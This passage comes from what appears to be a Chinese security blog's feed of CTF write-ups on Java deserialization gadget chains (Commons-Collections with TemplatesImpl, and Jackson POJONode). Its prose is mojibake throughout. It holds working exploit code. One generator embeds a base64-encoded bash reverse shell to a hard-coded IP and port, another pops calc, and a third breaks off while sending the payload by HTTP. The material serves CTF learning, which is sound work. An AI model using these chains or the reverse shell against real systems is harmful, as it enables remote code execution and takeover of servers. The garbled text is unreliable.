ä¸º<strong>ConstantTransformer</strong>è¿™ä¸ªç±»çš„transformè¿”å›çš„å°±æ˜¯æœ¬èº«ï¼ˆå¤ªä¹…æ²¡çœ‹ccé“¾æœ‰ç‚¹å¿˜äº†</p><p>ä½†è¿˜æ˜¯é€šä¸äº†ï¼Œä¼šç»™æˆ‘æŠ¥é”™ClassNotFoundçš„é”™è¯¯</p><p>æˆ‘ååˆ†åœ°ä¸ç†è§£ï¼Œç†è®ºä¸ŠMyexpectèƒ½åœ¨ååºåˆ—åŒ–æ‰§è¡ŒnewInstanceï¼Œé‚£æˆ‘ç›´æ¥æ‰§è¡Œæ¶æ„ç±»çš„newInstanceä¸å°±å¥½äº†ï¼Œå¹¶ä¸éœ€è¦å»å†æ‰“cc3åé¢ä¸€æ•´ä¸ªéƒ¨åˆ†ï¼Œä½†æ˜¯ä»–å°±æ˜¯ä¸è¡Œï¼Œæˆ‘ä¹Ÿæ²¡æ‰¾å‡ºæ¥é—®é¢˜åœ¨å“ª</p><h2 id="æ‰¾åˆ°åŸå› "><a href="#æ‰¾åˆ°åŸå› " class="headerlink" title="æ‰¾åˆ°åŸå› "></a>æ‰¾åˆ°åŸå› </h2><p>å“¦caoè°ƒäº†åŠå¤©ï¼Œæˆ‘å»çœ‹äº†ä¸€ä¸‹è°ƒç”¨æ ˆç»ˆäºå‘ç°é—®é¢˜äº†</p><p><img src="https://cdn.clown2024.cn/202410151636181.png" alt="image-20241015163634114"></p><p><img src="https://cdn.clown2024.cn/202410151636869.png" alt="image-20241015163641816"></p><p><img src="https://cdn.clown2024.cn/202410151636685.png" alt="image-20241015163650638"></p><p>è¿˜æ˜¯åŸºç¡€ä¸ç‰¢çš„åŸå› å•ŠğŸ˜­</p><p>ä¸‹é¢æ ¹æ®ä¸Šé¢çš„å›¾è¯´ä¸€ä¸‹æˆ‘è‡ªå·±çš„ç†è§£ï¼Œå¯¹javaç±»åŠ è½½åˆæ¸…æ™°äº†ä¸€äº›</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é¦–å…ˆæ‰§è¡ŒnewInstanceçš„è¯éœ€è¦èµ°æ•´ä¸ªç±»åŠ è½½çš„æµç¨‹<br>ç„¶åä¼šå…ˆå»æ‰¾å…¨ç±»å<br>å› ä¸ºæ²¡æœ‰è¿™ä¸ªç±»æ‰€ä»¥åœ¨ClassForNameé€”ä¸­å°±ä¼šæŠ¥é”™<br>è€ŒdefineClassç›´æ¥ä»å­—èŠ‚ç å‘jvmæ³¨å†Œè¿™ä¸ªç±»ç›´æ¥è·³è¿‡äº†å‰é¢çš„æ­¥éª¤<br>æ‰€ä»¥è¦æ‰§è¡ŒTemplatesImplçš„defineClassæ‰è¡Œ<br></code></pre></td></tr></table></figure><p>ä¸‹é¢å†™ä¸€ä¸‹èƒ½é€šçš„expå§ï¼Œå°±æ˜¯å°è£…TrAXFilteræ¥æ‰“TemplatesImpl</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ciscn2023;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTA3LjIxMy84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templates &#125;);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;clown&quot;</span>,myexpect);<br><br>        <span class="hljs-comment">//cc5éƒ¨åˆ†</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(myexpect));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹valå±æ€§</span><br>        Class b= BadAttributeValueExpException.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">//ç”Ÿæˆbase64åºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br><span class="hljs-comment">//        System.out.println(encode);</span><br>        System.out.println(URLEncoder.encode(encode));<span class="hljs-comment">//ä¸€å®šè¦è®°å¾—urlç¼–ç ä¸ç„¶æ‰“ä¸é€š</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410151637073.png" alt="image-20241015163705024"></p><p><img src="https://cdn.clown2024.cn/202410151637818.png" alt="image-20241015163713767"></p>]]></content>
      
      
      <categories>
          
          <category> é¢˜ç›®å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JacksonåŸç”Ÿååºåˆ—åŒ–</title>
      <link href="/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&u_asig=1a0c381017287414696367848e00f7">https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&amp;u_asig=1a0c381017287414696367848e00f7</a></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Jacksonçš„åŸç”Ÿååºåˆ—åŒ–ä¸»è¦æ˜¯ä¸ºäº†è§¦å‘ä»»æ„getteræ–¹æ³•è°ƒç”¨é“¾å­ï¼Œç±»ä¼¼fastjsonåŸç”Ÿååºåˆ—åŒ–è§¦å‘getteré‚£æ ·</p><h1 id="getterè§¦å‘æµç¨‹"><a href="#getterè§¦å‘æµç¨‹" class="headerlink" title="getterè§¦å‘æµç¨‹"></a>getterè§¦å‘æµç¨‹</h1><p>æ—¢ç„¶è¦è°ƒç”¨ä»»æ„getteræ–¹æ³•ï¼Œé‚£æˆ‘ä»¬å°±è¦è§¦å‘getteræ–¹æ³•çš„æµç¨‹</p><p>Jacksonè§¦å‘getteræ˜¯åœ¨<strong>ObjectMapper#writeValueAsString</strong>æ–¹æ³•æ‰§è¡Œçš„æ—¶å€™</p><p>æ‰“ä¸ªæ–­ç‚¹è·Ÿè¸ªä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410130102864.png" alt="image-20241013010248819"></p><p>è¿™é‡Œè¯´å‡ ä¸ªå…³é”®æ–¹æ³•</p><p>å…ˆèµ°åˆ°DefaultSerializerProvider#serializeValueæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130106024.png" alt="image-20241013010627975"></p><p>è¿™é‡Œè·å–ä¸€ä¸ªåºåˆ—åŒ–å™¨ï¼Œæˆ‘ä»¬ä¼ å…¥äº†POJOå¯¹è±¡ï¼Œæ‰€ä»¥è¿”å›ä¸€ä¸ªBeanSerializer</p><p>ç„¶åå»åˆ°BeanSerializer#serializeæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130110595.png" alt="image-20241013011008553"></p><p>writeStartObjectå’ŒwriteEndObjectå°±æ˜¯åˆ†åˆ«åœ¨é¦–å°¾å†™ä¸Šâ€™{â€˜å’Œâ€™}â€™</p><p>è°ƒç”¨getteræ–¹æ³•å°±åœ¨serializeFieldsæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410130112193.png" alt="image-20241013011227152"></p><p>åœ¨serializeAsFieldæ–¹æ³•é‡Œé¢è¿™ä¸ªåœ°æ–¹è°ƒç”¨äº†getteræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130117833.png" alt="image-20241013011745786"></p><h2 id="pojonode"><a href="#POJONode" class="headerlink" title="POJONode"></a>POJONode</h2><p>å‰é¢è¯´çš„éƒ½æ˜¯åºåˆ—åŒ–çš„getterï¼Œå’Œååºåˆ—åŒ–æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œåœ¨Jacksonçš„åŸç”Ÿååºåˆ—åŒ–ä¸­ï¼Œåˆ©ç”¨çš„æ˜¯POJONodeçš„toStringæ–¹æ³•æ¥è§¦å‘å¯¹åº”ç±»å¯¹è±¡çš„getteræ–¹æ³•ï¼Œæˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹</p><blockquote><p>è¿™é‡Œæµ‹å¾—æ—¶å€™å‘ç°ç¦»è°±çš„åœ°æ–¹ï¼Œæµ‹è¯•å‡ºæ¥Jacksonåº”è¯¥æ˜¯åœ¨2.10.xæ‰æŠŠtoStringå»æ‰æ”¹åˆ°çˆ¶ç±»å»çš„ï¼Œåœ¨2.9.xä»¥åŠä¹‹å‰ï¼ŒPOJONodeè‡ªå·±æœ¬èº«æ˜¯æœ‰toStringæ–¹æ³•çš„ï¼Œè€Œä»–çš„çˆ¶ç±»BaseJsonNodeåè€Œæ˜¯æ²¡æœ‰å®ç°toStringçš„ï¼Œè¿™æ ·å°±ä¸èƒ½è¿›è¡Œåˆ©ç”¨äº†</p><p><img src="https://cdn.clown2024.cn/202410131258198.png" alt="image-20241013125810157"></p></blockquote><p>ä»–POJONodeæœ¬èº«æ˜¯æ²¡æœ‰toStringçš„ï¼Œæ˜¯åˆ°çˆ¶ç±»BaseJsonNodeæ‰æœ‰å®ç°ï¼Œç»§æ‰¿å…³ç³»å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">POJONode --&gt; ValueNode --&gt; BaseJsonNode<br></code></pre></td></tr></table></figure><p>BaseJsonNode#toString</p><p><img src="https://cdn.clown2024.cn/202410130142098.png" alt="image-20241013014250059"></p><p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªInternalNodeMapper.nodeToStringæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130143214.png" alt="image-20241013014346177"></p><p>æ¬¸æ˜¯ä¸æ˜¯çœ‹åˆ°äº†ä¸€ä¸ªç†Ÿæ‚‰çš„ä¸œè¥¿ï¼ŒwriteValueAsStringï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯è§¦å‘getteræ–¹æ³•çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯æ¼æ´è§¦å‘ç‚¹</p><p>æ‰€ä»¥è°ƒç”¨é“¾å°±æ˜¯è¿™æ ·çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><p>èƒ½è°ƒç”¨getteræ–¹æ³•å°±å¯ä»¥æ‰“é“¾å­äº†ï¼Œæ¯”å¦‚æ‰“TemplatesImpl</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>è§¦å‘toStringè‡ªç„¶å°±é€‰æ‹©æˆ‘ä»¬å¸¸ç”¨çš„BadAttributeValueExpExceptionäº†</p><p>é“¾å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException#readObject -&gt; POJONode#toString -&gt; BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.attack;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">attack_usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410131232076.png" alt="image-20241013123218942"></p><p>è¿™æ˜¯ä¼šå‘ç°æˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™å‡ºé”™äº†</p><p>æ ¹æ®é”™è¯¯å…ˆå»çœ‹ObjectOuptputStream#writeObject0æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410131234990.png" alt="image-20241013123431941"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šåˆ¤æ–­åºåˆ—åŒ–ç±»æ˜¯å¦å®ç°äº†writeReplaceæ–¹æ³•ï¼Œå®ç°äº†åˆ™ä¼šè¿›è¡Œè°ƒç”¨ï¼Œè€Œåœ¨BaseJsonNodeä¸­å®ç°äº†è¯¥æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•è°ƒç”¨çš„æ—¶å€™æŠ›å‡ºäº†å¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/202410131237369.png" alt="image-20241013123712324"></p><p>æ–‡ç« ä¸­ç›´æ¥å°†è¯¥æ–¹æ³•æ³¨é‡Šæˆ–åˆ å»å°±æ­£å¸¸äº†ï¼Œæˆ‘å‹’ä¸ªç®€å•ç²—æš´å•ŠğŸ˜¢</p><p>è¿™é‡Œéœ€è¦é‡å†™ä¸€ä¸‹jaråŒ…ï¼Œä¹‹å‰æ²¡å†™è¿‡é¡ºä¾¿è®°å½•ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.æ‰¾åˆ°ä½ æ‰€è¦é‡å†™çš„æ–¹æ³•çš„æ‰€åœ¨ç±»ï¼ŒæŸ¥çœ‹å…¶ä¸­çš„è·¯å¾„ï¼›<br><br>2.åœ¨æˆ‘ä»¬çš„srcç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåŒåŒ…ååŒç±»åçš„ç±»ï¼›<br><br>3.å°†jaråŒ…ä¸­çš„é‡å†™æ–¹æ³•æ‰€åœ¨ç±»çš„æ‰€æœ‰ä»£ç å¤åˆ¶åˆ°æˆ‘ä»¬æ–°å»ºçš„åŒåŒ…ååŒç±»åçš„ç±»ä¸­ï¼›<br><br>4.åœ¨æˆ‘ä»¬æ–°å»ºçš„åŒåŒ…ååŒç±»åçš„ç±»ä¸­ä¿®æ”¹å¯¹åº”çš„æ–¹æ³•ä¸­çš„ä»£ç <br><br>åŸç†ï¼š<br>ç¼–è¯‘è¾“å‡ºçš„æ—¶å€™ä¼šä¼˜å…ˆä½¿ç”¨æˆ‘ä»¬srcä¸‹é¢çš„ç±»ï¼Œè€Œä¸æ˜¯ä¼˜å…ˆä½¿ç”¨JaråŒ…é‡Œé¢çš„ç±»ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†è¦†ç›–jaråŒ…æ–¹æ³•çš„ç›®çš„<br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_41512902/article/details/125558275">https://blog.csdn.net/qq_41512902/article/details/125558275</a></p><p>æœ€åæ”¹æˆè¿™æ ·å°±è¡Œäº†</p><p><img src="https://cdn.clown2024.cn/202410131251160.png" alt="image-20241013125145111"></p><p>å†å»æ‰“ä¸€éexpè¯•è¯•</p><p><img src="https://cdn.clown2024.cn/202410131252817.png" alt="image-20241013125207733"></p><p>ç°åœ¨å°±èƒ½æ­£å¸¸å¼¹è®¡ç®—å™¨äº†</p><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><p>è¿™é‡Œå°±é‚£é˜¿é‡Œäº‘ctfçš„ä¸€é“é¢˜æ¥ä½œä¸ºä¾‹å­</p><p>é¢˜ç›®é™„ä»¶ï¼š<a href="https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1">https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1</a></p><p>åç¼–è¯‘ä¸‹jaråŒ…</p><p><img src="https://cdn.clown2024.cn/202410131311887.png" alt="image-20241013131145827"></p><p>å°±å‡ è¡Œä»£ç ï¼Œç›´æ¥è¯»å–æ•°æ®ååºåˆ—åŒ–</p><p>çœ‹äº†ä¸€ä¸‹ä¾èµ–å°±åªæœ‰springbootï¼Œé‚£è‚¯å®šæ˜¯æ‰“jacksonäº†ï¼Œspringbootä¾èµ–é»˜è®¤ç”¨jacksonï¼Œè€Œä¸”éƒ½æ”¾åˆ°è¿™å½“ä¾‹é¢˜äº†</p><p>é‚£å°±å¯ä»¥ç”¨å‰é¢çš„expæ‰“ä¸€ä¸ªJacksonåŸç”Ÿååºåˆ—åŒ–ï¼Œè¿™é‡Œè¿˜è¦è€ƒè™‘ä¸€ä¸ªé—®é¢˜å°±æ˜¯payloadçš„å‘é€ï¼Œå› ä¸ºè¿™é‡Œæ²¡æœ‰base64è§£ç ç›´æ¥copyè¿‡å»ä¼šå‡ºé”™ï¼Œæˆ‘è¿™é‡Œç›´æ¥ç”¨javaå‘è¯·æ±‚è¿‡å»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.attack;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">attack_usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span 